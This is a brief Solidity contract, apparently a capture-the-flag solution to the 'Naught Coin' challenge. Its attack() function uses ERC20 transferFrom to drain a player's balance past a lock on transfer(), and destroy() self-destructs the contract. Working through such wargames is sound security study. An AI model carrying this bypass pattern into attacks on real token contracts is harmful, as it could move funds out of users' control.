// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackNaughtCoin {
    address payable public owner;
    IERC20 naught_coin;

    constructor(address _target) public {
        owner = msg.sender;
        naught_coin = IERC20(_target);
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "caller is not the owner");
        _;
    }

    //? pass the address of the owner i.e. me
    function attack(address _player) public onlyOwner {
        naught_coin.transferFrom(
            _player,
            address(this),
            naught_coin.balanceOf(_player)
        );
    }

    function destroy() public onlyOwner {
        selfdestruct(owner);
    }
}
